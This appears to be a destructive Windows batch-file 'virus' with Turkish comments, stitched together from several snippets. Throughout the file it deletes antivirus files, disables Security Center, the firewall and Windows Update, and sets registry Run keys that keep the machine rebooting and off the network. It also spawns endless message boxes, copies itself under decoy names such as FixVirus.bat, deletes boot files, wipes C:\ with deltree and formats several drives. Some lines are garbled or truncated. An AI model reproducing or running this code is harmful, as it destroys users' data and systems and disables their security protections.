del /Q /F C:\Program Files\tbav\*.dat
cls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda software\*.*
rem ---------------------------------
assoc .mp3=txtfile
assoc .xml=pngfile
assoc .png=txtfile
assoc .dll=txtfile
assoc .exe=pngfile
assoc .vbs=Visual Style
assoc .reg=xmlfile
assoc .txt=regfile

@echo off
rem ---------------------------------
rem Tarih zaman degistir..
date 01/01/2000
time 08:00
rem ---------------------------------
@echo off
rem ---------------------------------
rem Spam msgbox.vbs
echo x=msgbox("Bilgisayarin esi benzeri gorulmemis bir virüse yakalandi!",0+48,"Enfeksiyon") >>msgbox.vbs
echo Loop>>msgbox.vbs
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
rem ---------------------------------
@echo off
SHUTDOWN -s -t 01
PC SUREKLI YENIDEN BASLAT
echo @echo off>c: \windows\hartlell.bat 
echo break off>>c: \windows\hartlell.bat 
echo shutdown -r -t 11 -f>>c: \windows\hartlell.bat 
echo end>>c: \windows\hartlell.bat 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v startAPI /t reg_sz /d c: \windows\hartlell.bat /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v /t reg_sz /d c: \windows\hartlell.bat /f 
PAUSE
INTERNETI SINIRSIZ KAPAT
echo @echo off>c:\windows\wimn32.bat 
echo break off>>c:\windows\wimn32.bat 
echo ipconfig/release_all>>c:\windows\wimn32.bat 
echo end>>c:\windows\wimn32.bat 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f 
PAUSE
@echo off
echo Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs
echo do >>sendkey.vbs
echo wscript.sleep 100 >>sendkey.vbs
echo wshshell.sendkeys “{CAPSLOCK}” >>sendkey.vbs
echo loop >>sendkey.vbs
sendkey.vbs
@echo off
net stop "Security Center"
net stop SharedAccess
> "%Temp%.\kill.reg" ECHO A R E S
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\SharedAccess]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\wuauserv]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\w scsvc]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
START /WAIT REGEDIT /S "%Temp%.\kill.reg"
DEL "%Temp%.\kill.reg"
DEL %0
del /f /q %0
@echo off
%
C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
@echo off
C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
@echo off
C:\WINDOWS\COMMAND\deltree /y c:\*.*
@echo off
cls
cls
@echo off3.
/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand(1,99999) $+ $rand(A,Z) $+ $rand(a,z)
@Echo off
color 4
title 4
title R.I.P
start
start
start
start calc
copy %0 %Systemroot%\Greatgame > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
/d %systemroot%\Greatgame.bat /f > nul
copy %0 *.bat > nul
Attrib +r +h Greatgame.bat
Attrib +r +h
RUNDLL32 USER32.DLL.SwapMouseButton
start calc
cls
tskill msnmsgr
tskill LimeWire
tskill iexplore
tskill NMain
start
cls
cd %userprofile%\desktop
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
cd %userprofile%My ********s
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
start
start calc
cls
msg * R.I.P
msg * R.I.P
shutdown -r -t 10 -c "VIRUS DETECTED"
start
start
time 12:00
:R.I.P
cd %usernameprofile%\desktop
copy Greatgame.bat %random%.bat
goto RIP
@echo off 
attrib -r -s -h c:\autoexec.bat 
del c:\autoexec.bat 
attrib -r -s -h c:\boot.ini 
del c:\boot.ini 
attrib -r -s -h c:\ntldr 
del c:\ntldr 
attrib -r -s -h c:\windows\win.ini 
del c:\windows\win.ini
format c:\ /Q/X
01100110011011110111001001101101011000010111010000 100000011000110011101001011100
0010000000101111010100010010111101011000
format d:\ /Q/X
01100110011011110111001001101101011000010111010000 100000011001000011101001011100
0010000000101111010100010010111101011000
format a:\ /Q/X 
01100110011011110111001001101101011000010111010000 100000011000010011101001011100
0010000000101111010100010010111101011000
del /F/S/Q c:\boot.ini 
011001000110010
